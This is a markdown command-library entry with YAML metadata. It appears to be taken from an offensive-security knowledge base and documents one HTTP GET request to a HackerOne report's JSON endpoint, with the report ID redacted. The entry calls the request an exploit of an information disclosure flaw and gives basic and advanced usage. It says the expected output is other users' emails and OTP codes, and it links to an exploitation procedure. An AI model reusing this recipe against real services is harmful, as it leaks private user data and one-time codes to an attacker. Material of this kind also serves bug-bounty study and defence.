---
data: |-
  GET /reports/█████.json HTTP/2
  Host: hackerone.com
tags:
  - http
  - get
type: command
executor: bash
platforms:
  - Web
id: 6a9b6cee-0098-4f95-a710-7c221e2692d5
created_at: '2025-12-11T06:10:28.443Z'
updated_at: '2025-12-11T06:10:28.443Z'
verified: false
validated: true
submitted: true
---
# get-report-json

## Command

```bash
GET /reports/█████.json HTTP/2
Host: hackerone.com
```

## Description

Requests the JSON version of a HackerOne report, exploiting an information disclosure vulnerability to leak sensitive user data.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `Host` | Specifies the target host (hackerone.com) | Yes |
| `HTTP/2` | Protocol version | Yes |
| `/reports/█████.json` | Endpoint path with report ID | Yes |

## Examples

### Basic Usage

```bash
GET /reports/█████.json HTTP/2
Host: hackerone.com
```

### Advanced Usage

```bash
GET /reports/█████.json HTTP/2
Host: hackerone.com
User-Agent: custom-agent
```

## Expected Output

JSON response containing sensitive user attributes in the summaries section, such as email and OTP codes.

## Related

- [[commands/hash-to-json]]
- [[procedures/Exploit-Information-Disclosure-in-HackerOne-Report-JSON-Endpoint]]
